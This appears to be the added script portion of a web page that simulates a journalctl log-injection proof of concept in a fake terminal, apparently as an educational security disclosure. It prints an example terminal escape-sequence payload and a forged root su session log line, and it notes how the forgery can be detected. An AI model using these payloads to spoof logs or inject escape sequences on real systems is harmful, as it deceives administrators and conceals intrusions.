+function tline(html, cls){ const d = document.createElement('div'); d.className = 'term-line ' + (cls||''); d.innerHTML = html; screen.appendChild(d); screen.scrollTop = screen.scrollHeight; }
+function cmd(c){ tline('<span class="t-prompt">victim@host:~$</span> <span class="t-cmd">' + c + '</span>'); }
+const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+tline('<span class="t-out"># safe simulation — click a command below</span>');
+
+btnPoc.addEventListener('click', () => {
+  cmd('python3 journalctl_poc.py');
+  tline('[+] injected escape-injection: <span class="t-esc">b\'MESSAGE=\\x1b]2;POC ESCAPE INJECTION\\x07\\x0a\'</span>...', 't-out');
+  tline('[+] process comm renamed to: \'su\'', 't-out');
+  tline('[+] injected log-spoof: b\'MESSAGE=pam_unix(su:session): session opened for user root by person_we_setup(uid=1003)\'...', 't-out');
+  tline('&nbsp;', 't-out');
+  tline('payloads stored verbatim in the journal. now view them…', 't-hl');
+  injected = true;
+  [btnNoA, btnA, btnGrep].forEach(b => b.disabled = false);
+  btnPoc.disabled = true;
+});
+
+const logLinesNoA = () => {
+  tline('Aug 09 14:02:11 host victim[2201]: <span class="t-invis">[nonprintable bytes elided]</span>', 't-out');
+  tline('Aug 09 14:02:12 host <span class="t-hl">su[2201]</span>: pam_unix(su:session): session opened for user root by <span class="t-hl">person_we_setup(uid=1003)</span>', 't-out');
+};
+
+btnNoA.addEventListener('click', () => {
+  if (!injected) return;
+  cmd('journalctl --no-pager | tail -5');
+  logLinesNoA();
+  tline('→ escape bytes hidden by default output; nothing fires. spoofed line still reads as \'su\'.', 't-hl');
+});
+
+btnA.addEventListener('click', () => {
+  if (!injected) return;
+  cmd('journalctl -a --no-pager | tail -5');
+  tline('Aug 09 14:02:11 host victim[2201]: <span class="t-esc">^[]2;POC ESCAPE INJECTION^G</span>', 't-out');
+  tline('Aug 09 14:02:12 host <span class="t-hl">su[2201]</span>: pam_unix(su:session): session opened for user root by <span class="t-hl">person_we_setup(uid=1003)</span>', 't-out');
+  tline('→ raw bytes hit the terminal… OSC 0 interpreted:', 't-hl');
+  setTimeout(() => {
+    title.textContent = '⚠ POC ESCAPE INJECTION';
+    title.classList.add('pwned');
+    tline('→ <span class="t-esc">window title hijacked.</span> in a real terminal, ANY honoured escape sequence would execute here.', 't-esc');
+  }, 500);
+});
+
+btnGrep.addEventListener('click', () => {
+  if (!injected) return;
+  cmd('journalctl --no-pager | grep person_we_setup');
+  tline('Aug 09 14:02:12 host <span class="t-hl">su[2201]</span>: pam_unix(su:session): session opened for user root by <span class="t-hl">person_we_setup(uid=1003)</span>', 't-out');
+  tline('→ looks like a root su session — but _UID=1003 and _EXE=/usr/bin/python3 give it away.', 't-hl');
+});
+
+document.getElementById('btnTermReset').addEventListener('click', () => {
+  screen.innerHTML = ''; title.textContent = 'victim@host: ~'; title.classList.remove('pwned');
+  injected = false; btnPoc.disabled = false;
+  [btnNoA, btnA, btnGrep].forEach(b => b.disabled = true);
+  tline('<span class="t-out"># safe simulation — click a command below</span>');
+});
+
+/* ---------- copy code ---------- */
+document.getElementById('copyCode').addEventListener('click', async (e) => {
+  try {
+    await navigator.clipboard.writeText(document.getElementById('codeBlock').innerText);
+    e.target.textContent = 'copied ✓';
+    setTimeout(() => e.target.textContent = 'copy', 1500);
+  } catch { e.target.textContent = 'select & copy'; }
+});
+</script>
+</body>
+</html>
